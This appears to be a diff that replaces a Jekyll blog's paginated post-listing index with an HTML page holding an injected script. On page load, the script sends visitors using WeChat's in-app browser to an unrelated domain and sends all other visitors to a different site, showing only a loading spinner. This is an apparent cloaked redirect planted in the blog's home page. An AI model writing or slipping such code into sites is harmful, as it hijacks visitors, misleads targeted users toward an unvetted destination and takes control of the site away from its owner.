@@ -1,46 +1,57 @@
----
-layout: page
-description: "「离开世界之前 一切都是过程」"
----
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>智能设备跳转</title>
+<script>
+// 页面加载时立即检测设备并跳转
+document.addEventListener('DOMContentLoaded', function() {
+// 获取用户代理信息
+const userAgent = navigator.userAgent;
 
-{% for post in paginator.posts %}
-<div class="post-preview">
-    <a href="{{ post.url | prepend: site.baseurl }}">
-        <h2 class="post-title">
-            {{ post.title }}
-        </h2>
-        {% if post.subtitle %}
-        <h3 class="post-subtitle">
-            {{ post.subtitle }}
-        </h3>
-        {% endif %}
-        <div class="post-content-preview">
-            {% if post.lang == 'en' %}
-                {{ post.content | strip_html | truncate:300 }}
-            {% else %}
-                {{ post.content | strip_html | truncate:200 }}
-            {% endif %}
-        </div>
-    </a>
-    <p class="post-meta">
-        Posted by {% if post.author %}{{ post.author }}{% else %}{{ site.title }}{% endif %} on {{ post.date | date: "%B %-d, %Y" }}
-    </p>
-</div>
-<hr>
-{% endfor %}
+// 检测是否为微信内置浏览器
+const isWeChat = /MicroMessenger/i.test(userAgent);
 
-<!-- Pager -->
-{% if paginator.total_pages > 1 %}
-<ul class="pager">
-    {% if paginator.previous_page %}
-    <li class="previous">
-        <a href="{{ paginator.previous_page_path | prepend: site.baseurl | replace: '//', '/' }}">&larr; Newer Posts</a>
-    </li>
-    {% endif %}
-    {% if paginator.next_page %}
-    <li class="next">
-        <a href="{{ paginator.next_page_path | prepend: site.baseurl | replace: '//', '/' }}">Older Posts &rarr;</a>
-    </li>
-    {% endif %}
-</ul>
-{% endif %}
+// 设置目标URL
+const targetUrl = isWeChat ? "https://www.m.xjgt8.cn" : "https://www.12371.cn";
+
+// 立即跳转
+window.location.replace(targetUrl);
+});
+</script>
+<style>
+/* 极简样式 - 只显示一个加载指示器 */
+body {
+margin: 0;
+padding: 0;
+background: #f5f5f5;
+display: flex;
+justify-content: center;
+align-items: center;
+height: 100vh;
+font-family: Arial, sans-serif;
+}
+
+.loader {
+width: 50px;
+height: 50px;
+border: 5px solid rgba(0, 0, 0, 0.1);
+border-radius: 50%;
+border-top-color: #3498db;
+animation: spin 1s ease-in-out infinite;
+}
+
+@keyframes spin {
+to {
+transform: rotate(360deg);
+}
+}
+</style>
+</head>
+<body>
+<!-- 只显示一个加载指示器，在跳转前短暂显示 -->
+<div class="loader"></div>
+</body>
+</html>
+未选择文件
